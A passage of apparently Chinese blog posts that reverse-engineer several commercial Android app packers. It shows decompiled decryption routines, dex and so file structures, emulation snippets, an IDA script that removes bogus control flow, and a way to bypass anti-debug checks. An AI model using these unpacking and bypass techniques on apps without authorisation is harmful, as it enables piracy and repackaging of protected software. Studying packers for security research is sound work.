*)&amp;v15 + v6++) = *(_BYTE *)(v12 + v7); } while ( v6 != 256 ); v9 = v3; do { v10 = (unsigned __int8)*v9; v5 = (v10 + v5 + *(unsigned __int8 *)v8) % 256; *v9 = v3[v5]; v3[v5] = v10; --v4; v8 = (char **)((char *)v8 + 1); ++v9; } while ( v4 ); result = _stack_chk_guard - v14; if ( _stack_chk_guard != v14 ) { ((void (*)(void))unk_E15BF3EC)(); JUMPOUT(&amp;unk_E15D7BA4); } return result; } key1计算得出key3，用key3进行解密 // sub_E159CEB4(&amp;key3, info.dex[x].data, info.dex[x].data_size); int __fastcall sub_E159CEB4(int result, _BYTE *a2, int a3) { int v3; // r3 int v4; // r4 int v5; // r3 int v6; // ST08_4 _BYTE *v7; // r6 int v8; // r3 int v9; // r5 _BYTE *v10; // r0 v3 = 0; if ( a3 ) { v4 = 0; do { v5 = (v3 + 1) % 256; v6 = v5; v7 = (_BYTE *)(result + v5); v8 = *(unsigned __int8 *)(result + v5); v9 = result; v4 = (v8 + v4) % 256; v10 = (_BYTE *)(result + v4); *v7 = *v10; *v10 = v8; result = v9; *a2 ^= *(_BYTE *)(v9 + (((unsigned __int8)*v7 + v8) &amp; 0xFF)); v3 = v6; --a3; ++a2; } while ( a3 ); } return result; } 第二步解密上一步得到的结果用lzma解压后，将每个字节与key2进行异或就可以了。 指令还原原指令被加密并且opcode被改为私有的指令，将加密的指令使用0x65异或得到除opcode的原指令。比如： // 原指令 6E 20 E7 2B 32 00 // 加密后的指令 A9 45 82 4E 57 65 // xor 0x65 CC 20 E7 2B 32 00 壳通过table[私有指令(上例的0xCC) + 0x5C]得到一个操作数，用这个操作数跳转到对应的 switch case 执行相应的dalvik指令。 然后使用参考2的方法还原所有指令： 有一个好点的办法就是：自己在onCreate方法中将所有的dalvik指令，一共200多条全部写出来。然后用360加固，动态调试，总结出每条dalvik指令对应的360解释器的case处理指令的偏移，最后得到一张指令映射表。这样，后续在脱壳的时候，就可以根据解释执行代码的偏移，还原出原来的指令。当然，360解释器也是在不断变化的，所以，这个表也是要跟着变化的。 参考[1] 某VMP加固onCreate方法分析 [2] 某数字公司VMP脱壳简记","tags":[{"name":"Android加固","slug":"Android加固","permalink":"http://www.ench4nt3r.com/tags/Android加固/"}]},{"title":"某加密加固分析","date":"2018-01-31T08:09:18.000Z","path":"2018/01/31/post/","text":"Apk解密加密后的apk文件是assetsi/jiami.dat解密代码如下： void decrypt(char *data, long size) { const char *k1 = &quot;Auto-generated destructor stub&quot;; for (int i = 0; i &lt; size; i++) { int t1 = k1[i % 0x1e]; int t2 = t1 &amp; (~data[i]); int t3 = data[i] &amp; (~t1); data[i] = t2 | t3; } } 指令还原某加密通过hookart::ClassLinker::LoadMethod函数，在该函数被调用时还原相应的函数指令。相关的指令信息存在assets/ijiami.ajm文件中。 ijiami.ajm解密代码： void decrypt(char* data, long size) { static unsigned char k1[] = { 0x89, 0xF1, 0xBE, 0x10, 0x80, 0x95, 0x22, 0xA3, 0x99, 0x12, 0x98, 0xDD, 0xF2, 0x9, 0x44, 0x53, 0x2, 0xB3, 0x9F, 0x16, 0x45 }; static char* k2 = &quot;bb2ec1256fd29305005eb6f5ecb2036c&quot;; for (int i = 0; i &lt; size; i++) { int t1 = k1[(i % 0x12) + 1]; int t2 = i - (((i &gt;&gt; 0x1f &lt;&lt; 0x1b) + i) &amp; 0xFFFFFFE0); unsigned char t3 = k2[t2]; int t4 = t3 &amp; (~t1); int t5 = t1 &amp; (~t3); int t6 = t5 | t4; int t7 = t6 &amp; (~data[i]); int t8 = data[i] &amp; (~t6); data[i] = t7 | t8; } } 解密后是一个zip文件，里面有一个classes.dex.ajm文件。 classes.dex.ajm文件格式： struct ajm { byte type; byte data[1]; }; 其中type为0x12的是存储的类信息的数据: struct class_info { byte type; // 0x12 uleb len; // 整个数据的长度 struct { byte type; // 0x08 byte key[4]; } debug_info; struct { byte type; // 0x10 byte data[2]; } unknow; // 函数签名 struct { byte type; // 0x1a uleb len; char data[1]; } method_sig; // 函数指令 struct { byte type; // 0x22 uleb len; byte data[1]; } method_inst; // 可能是结束符 struct { byte type; // 0x28 byte data; // 0x0 } end; }; type为8的，格式如下: struct unknow { byte type; // 0x8 uled data[1]; }; 将class_info.debug_info.key经过计算得到与Java类函数debugInfo字段的值： class_info.debug_info.key + 0x71AFC1F4 - 0x36c + 0x8E503E0C 然后通过该key来查找对应的函数指令。函数指令解密方法： data = class_info.method_inst.data for i in xrange(len(data)): data[i] = data[i] and ~data[i] &amp; 0xff 参考[1] 爱加密企业版静态脱壳机编写","tags":[{"name":"Android加固","slug":"Android加固","permalink":"http://www.ench4nt3r.com/tags/Android加固/"}]},{"title":"某梆加固分析","date":"2018-01-11T07:15:22.000Z","path":"2018/01/11/2018-01-11/","text":"文件验证assets/meta-data/manifest.mf 文件结构 struct __attribute__ ((packed)) manifest { byte unknow; char base64_1_len[2]; char *base64_1; char base64_2[28]; char base64_3[28]; char base64_4[28]; char base64_5[28]; char base64_6[28]; struct { char sha1_base64[4]; char sha256_base64[4]; char sha384_base64[4]; char sha512_base64[4]; char crc[4]; } files_sig[1]; }; 然后读取apk每个文件的CRC，将最后四个字节与manifest.file_sig[x].crc对比，并且将所有CRC最后四个字节拼接起来，做一次sha再做base64，与manifest.base64_6对比。 Dex文件解密加密的Dex文件：assets/secDataX.jar 解密函数如下： unsigned int __fastcall sub_EF4F6838(unsigned int result, unsigned __int8 *a2, int a3) { int v3; // r6 int v4; // r4 int v5; // r8 signed int v6; // r4 int v7; // lr int v8; // r5 int v9; // r9 int v10; // r12 int v11; // lr int v12; // r5 int v13; // r4 char v14; // r12 unsigned __int8 *v15; // lr char v16; // r0 int v17; // r8 int v18; // t1 unsigned __int8 *v19; // r1 char v20[256]; // [sp+4h] [bp-124h] if ( result &gt;= 0x20000 ) { v3 = 0; } else { v3 = 0x20000 - result; if ( (signed int)(0x20000 - result) &gt;= a3 ) v3 = a3; a3 -= v3; if ( v3 &gt; 0 ) { v4 = 0; v5 = dword_EF522C70; do { v20[v4] = v4; ++v4; } while ( v4 != 256 ); v6 = 0; v7 = 0; v8 = 0; do { v9 = (unsigned __int8)v20[v8]; v10 = *(unsigned __int8 *)(v5 + v6++); v7 += v10 + v9; if ( v6 &gt; 15 ) v6 = 0; v7 = (unsigned __int8)v7; v20[v8++] = v20[(unsigned __int8)v7]; v20[v7] = v9; } while ( v8 != 256 ); v11 = 0; LOBYTE(v12) = 0; LOBYTE(v13) = 0; while ( v11 != result ) { ++v11; v13 = (unsigned __int8)(v13 + 1); v14 = v20[(unsigned __int8)v13]; v12 = (unsigned __int8)(v12 + v14); v20[v13] = v20[v12]; v20[v12] = v14; } v15 = a2; do { v13 = (unsigned __int8)(v13 + 1); v16 = v20[v13]; v12 = (unsigned __int8)(v12 + v16); v20[v13] = v20[v12]; v20[v12] = v16; v17 = (unsigned __int8)v20[(unsigned __int8)(v16 + v20[v13])]; v18 = *v15++; result = v17 ^ v18; *(v15 - 1) = v17 ^ v18; } while ( v15 != &amp;a2[v3] ); } } if ( a3 &gt; 0 ) { v19 = &amp;a2[v3]; result = (unsigned int)v19; do *v19++ ^= 0xACu; while ( (signed int)&amp;v19[-result] &lt; a3 ); } return result; } dword_EF522C70是定值，在运行时赋值。可以通过idaemu模拟这个函数解密。 mu = idaemu.Emu(idaemu.UC_ARCH_ARM, idaemu.UC_MODE_THUMB) mu.setData(key_addr, xxx) mu.setData(0xEF0EBC70, key_addr) data = # 被加密的Dex的数据 size = len(data) mu.setData(0x7000000, data) mu.eFunc(0xEF0BF838, None, [0, 0x7000000, size]) 通过反射调用makeDexElements加载Dex。","tags":[{"name":"Android加固","slug":"Android加固","permalink":"http://www.ench4nt3r.com/tags/Android加固/"}]},{"title":"某度加固分析","date":"2017-12-10T16:00:00.000Z","path":"2017/12/11/2017-12-11/","text":"被加密的JNI_OnLoad在IDA中查看JNI_OnLoad函数，可以看见是被加密的。通过IDA调试，在init array中的第一个函数（sub_41764）执行完成后，JNI_OnLoad也被解密了，这样看来sub_41764函数是用来解密JNI_Onload函数咯。 用IDA反编译sub_41764函数，反编译出来的结果根本就不是人能看的，伪代码有大量的花指令，很明显是ollvm中的bcf混淆。 去除BCF在ollvm的wiki里面有说bcf的原理，在一些基本块前面加入一个新的基本块，并且这个基本块包含了一个表达式，这个表达式用来控制程序的执行。 这个表达式是长这样：(y &lt; 10 || x * (x - 1) % 2 == 0)，当表达式结果为True时执行真实的基本块，为False时，不可能的，x * (x - 1)的结果永远是奇数，所以不可能满足条件执行False的执行块。 由于x和y都是全局变量，使用IDA的xref很容易就找到bcf基本块的位置。可是，找到bcf基本块之后不能直接将这个块给删除掉，因为它很有可能跟一些真实的指令混在一起。 因此，我们需要将属于bcf的指令和真实的指令分开。做这件事也并不难，通过观察汇编(Thumb)代码，提取到一些BCF使用的指令，构造一个DFA处理他们。状态图如下： 其中状态8，期待下一条指令是SUBS，但是在我的样本中，有可能是真实的指令(MOV)，所以仍然将状态转移到8。如果到达完成状态，那么可以将所有bcf指令删除掉。需要注意的是，这里有两个完成状态，分别是14和16，状态14的意思是，后面跟随着真实的基本块（bcf表达式为True的后继），所以可以直接将分支指令删除，但是如果是状态16，那么需要插入一个跳转，跳转到BLE指令后面的地址。 class BCFProcessor: ... def check(self, ea): self.state = -1 self.patch_ea = [] while True: ori_state = state mnem = idc.GetMnem(ea) state = self.func_maps[state](mnem) # 对应的状态处理函数 if state == -1: return False, ea elif state in (14, 16): break if ori_state != state: self.patch_ea.append(ea) # bcf指令，需要删除 ea += ItemSize(ea) self.state = state self.end_ea = ea return True, ea ... xrefs = XrefsTo(x) for xref in xrefs: if xref.frm &lt; cur_func.start_ea or \\ xref.frm &gt; cur_func.end_ea: continue if not is_code(xref.frm): print(&apos;{}: expecting code reference, skip.&apos;.format(hex(xref.frm))) continue ret, ea = processor.check(xref.frm) if not ret: print(&apos;{}: unexpected instruction, skip.&apos;.format(hex(ea))) continue processor.patch() # 指令删除（修改为nop指令) idc.plan_and_wait(cur_func.start_ea, cur_func.end_ea) # 让IDA重新分析该函数 clean_node(cur_func) 上面的清理将很多分支指令给删了，所以出现了很多没有前驱的基本块（bcf表达式为False的后继）。通过遍历图，很容易就能将这些没有前驱的基本块删了。代码如下： def clean_node(func): done = False while not done: done = True q = idaapi.qflow_chart_t(&quot;The title&quot;, func, 0, 0, idaapi.FC_PREDS) assert(q[0].start_ea == func.start_ea) for n in xrange(1, q.size()): b = q[n] if q.npred(n) != 0: # 判断前驱结点数 continue done = False size = b.end_ea - b.start_ea MakeUnknown(b.start_ea, size, idaapi.DOUNK_SIMPLE) MakeData(b.start_ea, idaapi.FF_BYTE, size, 0) 代码中有两个Make*指令，我不知道怎么将一个基本块从图中删除，所以将它们标为数据，视为删除。每当删除一个基本块时，又有可能增加了一个基本块（该基本块只有一个前驱，前驱结点是刚删除的块），所以只有当到达一个不动点时，才结束运行。 IDA并不保证对所有的x和y都能生成xref，我的解决办法是将数据写回文件，并用IDA重新打开被修改后的文件。 去除FLA去除了bcf后又能看见一个惊喜，反编译出来的代码明显是用FLA混淆的，好了，继续吧。 去除fla用符号执行是一个很好的选择，可以参考[1]。 在参考1的文章提到，将基本块分为主分发器、子分发器、retn块、真实块、预处理器这几个部分，并且只需要将真实块和retn块连接起来就可以了。在我的样本中，只有一个子分发器，并且同一个真实块有可能跳到的不同分支。 将子分发器的每个后继结点，从左到右命名，为case1、case2、 case 3、…。其中case6里面有一个if，会导致分支走向改变，分别走向case17和case29。case12和case20共同一个尾部块（预处理器块的前驱）。对于这几个块需要手工处理，其他的可以跟参考[1]那样做。 sub_41764函数首先修改so前0x1000字节的内存属性 v36 = syscall(125, v35, 4096, 3);// mprotect(v37, 0x1000, PROT_READ | PROT_WRITE) 并且将program header和section header的内容清零 v45 = *v149; // base addr *v42 = (int)&amp;(*v44)-&gt;e_ident[v45-&gt;e_phoff];// program header *v43 = (*v41)-&gt;e_phentsize * (*v41)-&gt;e_phnum;// program header size *v152 = 0; while ( 1 ) // memset(program header, 0, program header size) { v47 = 0; if ( *v152 &lt;= (unsigned int)*v43 ) v47 = 1; if ( !(v47 &amp; 1) ) break; *(_BYTE *)(*v42 + (*v152)++) = 0; } .... *v46 = (*v41)-&gt;e_ehsize; for ( *v48 = 0; ; ++*v48 ) // memset(elf header, 0, e_ehsize) { v49 = 0; if ( *v48 &lt; (unsigned int)*v46 ) v49 = 1; if ( !(v49 &amp; 1) ) break; (*v41)-&gt;e_ident[*v48] = 0; } v18 = v39; 修改 0x2000 - 0x3B971的内存属性 syscall(125, *v172, *v161, 7); // mprotect(v172, 0x00039971, PROT_READ | PROT_WRITE | PROT_EXEC) 解密 0x2f75 - 0x3B971 v15 = v153; // 0x2f75 for ( *i = 6; ; *i = 6 ) // for(i = 0; i &lt; 0x0001C4FE; i++) { v5 = 0; if ( *v180 &gt;= *v146 ) v5 = 1; if ( v5 &amp; 1 ) break; *i = 17; *v160 = (int)*v15 + *v180; // 0x2f75 + i *i = 10; *v159 = (int)off_56008 + (_DWORD)*v15 - *v180 - 1;// 0x389fc + 0x2f75 - i - 1 *i = 26; v32 = v160; v33 = v145; *(_BYTE *)v145 = *(_BYTE *)*v160; v34 = v159; *(_BYTE *)*v32 = *(_BYTE *)*v159; // 0x2f75[i] = *(0x389fc + 0x2f75 - i - 1) *(_BYTE *)*v34 = *(_BYTE *)v33; // *(0x389fc + 0x2f75 - i - 1) = 0x2f75[i] *i = 16; ++*v180; } 从上面的代码可以看出，它将0x2f75 - 0x3B971这块区域的字节调换，达到加密的效果。 JNI_OnLoad函数一番折腾后，终于能看见JNI_Onload函数了。糟糕的是，这个函数也加了BCF，不过还好，用上面的方法也能去掉混淆。 JNI_OnLoad主要做了这些操作: 1. 初始化函数指针（该so不直接调用c运行时的函数） 2. 创建一些线程（反调试以及一些全局变量初始化） 3. 加载dex 加密的字符串大量的字符串被加密了，并且每个解密函数都不一样。逆就懒得逆了，反编译看了一下，它们长的都差不多，用idaemu模拟执行一下也是可以的。 def get_str(addr, size, uc): return uc.mem_read(addr, size).decode(&apos;ascii&apos;) def emulate(addr, args): heap_addr = 0x80000 head_size = 0x1024 malloc_size = [None] def malloc_hook(uc, out, args): malloc_size[0] = args[0] return heap_addr mu = idaemu.Emu(idaemu.UC_ARCH_ARM, idaemu.UC_MODE_THUMB) # heap mu.setData(heap_addr, &apos;\\x00&apos; * head_size) mu.alt(0x000028EC, malloc_hook, 1) ret = mu.eFunc(addr, None, args) return get_str(ret, malloc_size[0], mu.curUC) 调用emulate函数就能得到每个字符串原本的模样了。 对了，idaemu执行thumb的代码会出错，因为它没有对地址加一。在_emulate函数的uc.emu_start调用前加一句就好了 def _emulate(...): ... if self.mode == UC_MODE_THUMB: startAddr |= 1 uc.emu_start(startAddr, stopAddr, timeout=TimeOut, count=Count) 线程和反调试这里的反调试很有趣，如果检测到调试状态的话，它会将某些地方的指令修改掉，然后执行到那的时候程序就崩了，遗憾的是，有个全局变量能控制这个行为。将0x56008赋为0的话就可以绕过了（目前没有发现0x56008的其他用途）。 对于sub_26914和sub_2693C这两个函数，是直接调用了exit来结束程序，不过可以让执行这两个函数的线程直接休眠或者nop掉。 Dex加载为了进行解密，需要在加载之前，Hook一些函数。 首先校验apk文件中的classes.dex文件的大小是否一致，如果一致，将assets/baiduprotect&lt;i&gt;.jar解压到/data/data/xxxxxxx/.&lt;i&gt;/1.jar，i是一个从1开始的整数。接着，使用类加载器进行加载Dex，在加载Dex的时候会调用到被Hook的函数，这时候进行解密操作。加载完成之后，将Dex加入当前环境，这就完成了解固操作。 解密jar首先对1.jar的前0x1000个字节解密 /* v8 是密钥，来自程序的签名 v6 是指向待解密区域的指针 a5 是包名异或之后的值 */ ... v39 = a3 - 16; v19 = (a3 - 16) &amp; 0xFFFFFFF0; v12 = (char *)a1 + v19 + 16; do { v20 = v9; v21 = v8; ((void (__fastcall *)(_DWORD *, int *, int))v9)(v6, &amp;v41, v8); // aes v10 -= 16; v8 = v21; v22 = *v6; v9 = v20; *v6 = *(_DWORD *)a5 ^ v41; *(_DWORD *)a5 = v22; v23 = v6[1]; v6[1] = *((_DWORD *)a5 + 1) ^ v42; *((_DWORD *)a5 + 1) = v23; v24 = v6[2]; v6[2] = *((_DWORD *)a5 + 2) ^ v43; *((_DWORD *)a5 + 2) = v24; v25 = v6[3]; v6[3] = *((_DWORD *)a5 + 3) ^ v44; v6 += 4; *((_DWORD *)a5 + 3) = v25; } while ( v10 &gt; 0xF ); ... 解密jar完成之后，解压里面的classes.dex到内存，进行类数据的解密和修复。 在dex文件偏移 file length - 280 处，有一个结构体，记录着类数据相关信息： struct java_class_info { int pos; // map item 位置 int size; // 类数据大小 int offset; // 原类数据偏移 int encrypted; // 已加密的类数据偏移 }; 已加密的类数据偏移计算方法是：file length - 280 - java_class_info.encrypted - 4 * 类数量 - java_class_info.size。 解密类数据: v13 = (v10-&gt;dataSize + 1) * (v11 + 1) * (v10-&gt;fieldIdsSize + 1) * (v10-&gt;protoIdsSize + 1) * (v10-&gt;typeIdsSize + 1) * (v10-&gt;stringIdsSize + 1) * (v10-&gt;methodIdsSize + 1); v14 = (v13 &gt;&gt; 6) &amp; 0x3FC; v15 = (unsigned __int16)v13 &gt;&gt; 8; v17 = -256 - v14; if ( !v15 ) v17 = -260; v31 = &amp;off_553D8; sub_3B90C((int)&amp;v31, 0, x + v17, 0x100u); // x 是上面已加密的类数据偏移计算的结果 memcpy(java_class_info.offset, x, v18[1]); // 解密 sub_3B758(&amp;v31, java_class_info.offset, java_class_info.size, java_class_info.offset); 上面两个函数就不贴了，都是异或。然后插入一个map item，类型是kDexTypeClassDataItem。 if ( java_class_info.pos ) { map_off = v6-&gt;pHeader-&gt;mapOff; map_addr = map_off + 4 + base addr; memcpy(&amp;v30, map_addr + 12 * map size, 12); // map item 后移 for( i = map size; i &gt; java_class_info.pos; i--) { addr = 12 * i + map_addr; memcpy(addr, addr - 12, 12); } memcpy(map_addr + 12 * java_class_info.pos，&amp;v30, 12); *map_addr += 1； java_class_info.pos = 0; } 最后是修复类偏移。 v8 = sub_119B4(dex, v73, v71, *v7); for(int i = 0; i &lt; v71-&gt;pHeader-&gt;classDefsSize; i++) { v16 = &amp;v71-&gt;pClassDefs[i]; v16-&gt;classDataOff = ~*(v8 + 4 * i) * 291; } 去除BCF的脚本源码import idaapi class BCFProcessor: def __init__(self): def state0(mnem): return 1 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1 def state1(mnem): return 2 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1 def state2(mnem): return 3 if mnem == &apos;ADD&apos; else -1 def state3(mnem): return 4 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1 def state4(mnem): return 5 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1 def state5(mnem): return 6 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1 def state6(mnem): if mnem == &apos;SUBS&apos;: return 7 elif mnem == &apos;MOV&apos;: return 6 return -1 def state7(mnem): return 8 if mnem == &apos;MULS&apos; else -1 def state8(mnem): return 9 if mnem == &apos;TST.W&apos; else -1 def state9(mnem): if mnem == &apos;IT NE&apos;: return 10 elif mnem in (&apos;BEQ&apos;, &apos;BEQ.W&apos;): return 11 elif mnem in (&apos;SUB.W&apos;, &apos;LDR.W&apos;, &apos;MOV&apos;, &apos;STR.W&apos;): return 9 return -1 def state10(mnem): return 15 if mnem == &apos;CMPNE&apos; else -1 def state11(mnem): return 12 if mnem == &apos;CMP&apos; else -1 def state12(mnem): if mnem in (&apos;BGT&apos;, &apos;BGT.W&apos;): return 15 elif mnem in (&apos;BLE&apos;, &apos;BLE.W&apos;): return 14 return -1 def state13(mnem): return 3 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1 self.func_maps = [] for i in xrange(0, 14): self.func_maps.append(locals().get(&apos;state{}&apos;.format(i))) def check(self, ea): self.state = -1 self.patch_ea = [] state = 0 new_ea = get_prev_ea(ea, 3) if idc.GetMnem(new_ea) not in (&apos;LDR.W&apos;, &apos;LDR&apos;): new_ea = get_prev_ea(ea, 1) assert(idc.GetMnem(new_ea) in (&apos;LDR.W&apos;, &apos;LDR&apos;)) state = 13 ea = new_ea while True: ori_state = state mnem = idc.GetMnem(ea) state = self.func_maps[state](mnem) if state == -1: return False, ea elif state in (14, 15): break if ori_state != state: self.patch_ea.append(ea) ea += ItemSize(ea) self.state = state self.end_ea = ea return True, ea def patch(self): end_size = ItemSize(self.end_ea) target_ea = idc.GetOperandValue(self.end_ea, 0) self.patch_ea.append(self.end_ea) for ea in self.patch_ea: ea_size = ItemSize(ea) fill_nop(ea, ea_size) print(&apos;patch: {} - {}&apos;.format(hex(ea), hex(ea + ea_size))) if self.state == 14: new_ea = self.end_ea if end_size == 2: new_ea -= 2 fill_bw(new_ea, target_ea) print(&apos;new branch: {} -&gt; {}&apos;.format(hex(new_ea), hex(target_ea))) def is_code(ea): return idaapi.getFlags(ea) &amp; idaapi.MS_CLS == idaapi.FF_CODE def fill_nop(start_ea, size): nop_opcode = 0xbf00 for i in xrange(0, size, 2): idc.PatchWord(start_ea + i, nop_opcode) def fill_bw(ea, target_ea): offset = (target_ea - ea - 4) / 2 imm11 = offset &amp; 0x7ff imm10 = offset &gt;&gt; 11 &amp; 0x3ff s = 0 if offset &gt;= 0 else 1 j1 = offset &gt;&gt; 21 &amp; 1 ^ 1 ^ s j2 = offset &gt;&gt; 20 &amp; 1 ^ 1 ^ s idc.PatchWord(ea, 0xf000 | s &lt;&lt; 10 | imm10) idc.PatchWord(ea + 2, 0x9000 | j1 &lt;&lt; 13 | j2 &lt;&lt; 11 | imm11) def get_prev_ea(ea, n): for _ in range(0, n): ea = idc.prev_head(ea) assert(ea != idaapi.BADADDR) return ea def match_instruction(inst_list, ea): for inst in inst_list: if idc.GetMnem(ea) != inst: return False, ea ea += ItemSize(ea) return True, ea def clean_node(func): done = False while not done: done = True q = idaapi.qflow_chart_t(&quot;The title&quot;, func, 0, 0, idaapi.FC_PREDS) assert(q[0].start_ea == func.start_ea) for n in xrange(1, q.size()): b = q[n] if q.npred(n) != 0: continue done = False size = b.end_ea - b.start_ea MakeUnknown(b.start_ea, size, idaapi.DOUNK_SIMPLE) MakeData(b.start_ea, idaapi.FF_BYTE, size, 0) def bcf(x, y, cur_func): processor = BCFProcessor() xrefs = XrefsTo(x) for xref in xrefs: if xref.frm &lt; cur_func.start_ea or \\ xref.frm &gt; cur_func.end_ea: continue if not is_code(xref.frm): print(&apos;{}: expecting code reference, skip.&apos;.format(hex(xref.frm))) continue ret, ea = processor.check(xref.frm) if not ret: print(&apos;{}: unexpected instruction, skip.&apos;.format(hex(ea))) continue processor.patch() idc.plan_and_wait(cur_func.start_ea, cur_func.end_ea) clean_node(cur_func) def main(cur_func): x = 0x597F0 y = 0x59800 # x = 0x597F0 # y = 0x59800 bcf(x, y, cur_func) if __name__ == &apos;__main__&apos;: main(idaapi.get_func(here())) 参考[1] 利用符号执行去除控制流平坦化","tags":[{"name":"Android加固","slug":"Android加固","permalink":"http://www.ench4nt3r.com/tags/Android加固/"}]},{"title":"乐固（libshella 2.10.5.7）加固分析","date":"2017-09-10T09:37:00.000Z","path":"2017/09/10/legu-reverse/","text":"0x1 init_array[0]函数在第一个init_array函数中，首先会对 0x2000 - 0x3AAC的这块区域解密，解密代码如下： 1234567891011121314151617181920byte v98 = 43;byte v89 = -111;byte v97 = -103;byte v96 = 32;byte v95 = 21;byte v87 = 0;byte *v88 = base_addr;mprotect(base_addr + 0x2000, 0x2000, PROT_READ | PROT_WRITE);for ( j = 0x2000; j &lt;= 0x3AAC; ++j)&#123; v87 = v88[j]; v89 = (((v97 - v96) ^ j) + v95) ^ v98; v88[j] ^= v89; v88[j] += v96 &amp; v95 ^ v97; v98 += (v97 + v96 - v95) &amp; v87 &amp; j; v97 += (j + v98) ^ v87; v96 ^= (v87 - v98) ^ j; v95 += j - (v87 + v98);&#125;mprotect(base_addr + 0x2000, 0x2000, PROT_READ | PROT_EXEC); 解密会解出JNI_Onload和一个反调试函数，在解密完成后会调用pthread_create创建一个线程执行反调试函数。 0x2 反调试1234567891011int sub_36E8()&#123; int result; // r0@1 int v1; // [sp+4h] [bp-8h]@1 v1 = 0; dword_5018 = 0; result = pthread_create((int)&amp;v1, 0, (int)sub_335C, g_base_addr); dword_501C = 1; return result;&#125; 反调试的手段有3种，分别是： 1.监听/proc/self/mem, /proc/self/task/&lt;thread_id&gt;/mem的改变 2.检测/prc/self/status的State和TracerPid字段 3.对LOAD0(Program header)段进行校验 0x3 JNI_Onload这是一个假JNI_Onload，主要工作是解压出真正的so。 解压之前，会从文件偏移0x7DF8处读出一个结构体，存储着解压的必要信息。123456789101112131415161718192021222324252627282930313233343536struct compression_info &#123; void* min_vaddr; int size; int16 segment_offset; // 需要被解压的段的偏移 (段结构: segment_compression_info) int16 segment_num; // 段的数量 int unknow2; int strtab; // 字符串表偏移 int symtab; // 符号表偏移 int init_func; // init_func偏移 int init_array; // init_array偏移 int unknow7; int unknow8; int16 unknow9; int16 init_array_num; int16 needed_so_num; // 需要被加载的动态库数量 int16 unknow11; int needed_so_tab; // 需要被加载的动态库表的偏移 int unknow13; int symtab_num; int hashtab; int relocate0_tab; // 第一个重定位表的偏移 int relocate0_num; int relocate1_num; int relocate1_tab; // 第二个重定位表的偏移 int unknow14; int unknow16;&#125;;struct segment_compression_info &#123; int vaddr; int memsz; int offset; int filesz; int flags; int encrypted_size;&#125;; 读完必要的信息之后，对每个段进行解压：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970while ( (unsigned __int16)v17.segment_num &gt; v38 )&#123; v29 = segment_data-&gt;vaddr + load_bias; v28 = segment_data-&gt;memsz + v29; v27 = v29 &amp; 0xFFFFF000; v26 = (v28 + 4095) &amp; 0xFFFFF000; v25 = v26 - (v29 &amp; 0xFFFFF000); uncompressed_size = 0; // 已解压的数据大小 infsize = 0; if ( segment_data-&gt;filesz ) &#123; v9 = -1; v10 = 0; mmap(v27, v25, 3, 50); v13.zalloc = 0; v13.zfree = 0; v13.opaque = 0; v13.avail_in = 0; v13.next_in = 0; while ( inflateInit2_(&amp;v13, -15, \"1.2.3\", 56) ) ; while ( segment_data-&gt;filesz &gt; uncompressed_size ) &#123; // 每次只解压1KB if ( uncompressed_size + 4096 &lt;= segment_data-&gt;filesz ) // 大于0x1000 v4 = 4096; else // 剩余的size v4 = segment_data-&gt;filesz - uncompressed_size; v24 = v4; if ( uncompressed_size + 4096 &lt;= segment_data-&gt;encrypted_size ) v5 = 4096; else v5 = segment_data-&gt;encrypted_size - uncompressed_size; v23 = v5; // 读段数据 v24 = pread(v33, &amp;v14, v24, segment_data-&gt;offset + offset + uncompressed_size); // 解密 sub_122C((int)\"Tx:12345Tx:12345\", (int)&amp;v14, v23, 16); // 解压 v13.avail_in = v24; v13.next_in = (Bytef *)&amp;v14; _android_log_print(6, \"txtag\", \"read count:%x\", v24, v9, v10); v13.avail_out = 0x100000; v13.next_out = (Bytef *)(infsize + v29); v22 = inflate(&amp;v13, 0); infsize = infsize - v13.avail_out + 0x100000; uncompressed_size += v24; &#125; inflateEnd(&amp;v13); for ( i = v29; infsize + v29 &gt; i; i += 1024 ) cacheflush_0(i, 1024); _android_log_print( 6, \"txtag\", \"seg_start:%p size:%x infsize:%x offset:%x\\n\", v29, segment_data-&gt;filesz, infsize, segment_data-&gt;offset); &#125; if ( segment_data-&gt;flags &amp; 2 &amp;&amp; (signed int)(infsize &amp; 0xFFF) &gt; 0 ) memset((void *)(infsize + v29), 0, 4096 - ((infsize + v29) &amp; 0xFFF)); ++v38; ++segment_data;&#125; 可以看到，在解压之前，还会对段数据进行解密：12345678910111213141516171819202122232425262728293031323334signed int __fastcall sub_122C(int a1, int a2, unsigned int a3, int a4)&#123; int v5; // [sp+0h] [bp-24h]@1 int v6; // [sp+Ch] [bp-18h]@1 unsigned int v7; // [sp+10h] [bp-14h]@1 int v8; // [sp+14h] [bp-10h]@1 unsigned int i; // [sp+18h] [bp-Ch]@5 signed int v10; // [sp+1Ch] [bp-8h]@1 v6 = a1; v5 = a4; v10 = 0; v7 = a3 &gt;&gt; 3; v8 = a2; if ( a1 &amp;&amp; a2 &amp;&amp; !(a3 &amp; 7) &amp;&amp; a4 ) &#123; for ( i = 0; i &lt; v7; ++i ) &#123; *(_DWORD *)v8 ^= *(_DWORD *)(v6 + 8 * (v7 &amp; 1)); *(_DWORD *)(v8 + 4) ^= *(_DWORD *)(v6 + 8 * (v7 &amp; 1) + 4); // 调用TEA解密函数 // 参数： // arg1: 待解密的数据 // arg2: key // arg3: 输出结果的缓冲区 // arg4: 轮数 tea_decrypt(v6, v8, v8, v5); v8 += 8; &#125; v10 = 1; &#125; return v10;&#125; 解压完成之后，将加载依赖的动态库，重定位，替换符号表value值，替换当前so的符号表、字符串表、哈希表，最后调用init_func和init_array的函数。 在整个解压以及修复完成后，获取解压后的真·JNI_Onload函数，在真·JNI_Onload中调用RegisterNatives注册Java的Native函数。 12345678910111213141516171819static JNINativeMethod v6[] = &#123; &#123;\"load\", \"(Landroid/content/Context;)V\", (void*)0xEF0CD745&#125;, &#123;\"runCreate\", \"(Landroid/content/Context;)V\", (void*)0xEF0C9B2D&#125;, &#123;\"changeEnv\", \"(Landroid/content/Context;)V\", (void*)0xEF0C8CC5&#125;, &#123;\"reciver\", \"(Landroid/content/Intent;)V\", (void*)0xEF0C534D&#125;, &#123;\"txEntries\", \"(Ldalvik/system/DexFile;)Ljava/util/Enumeration;\", (void*)0xEF0C8BD9&#125;&#125;; v7 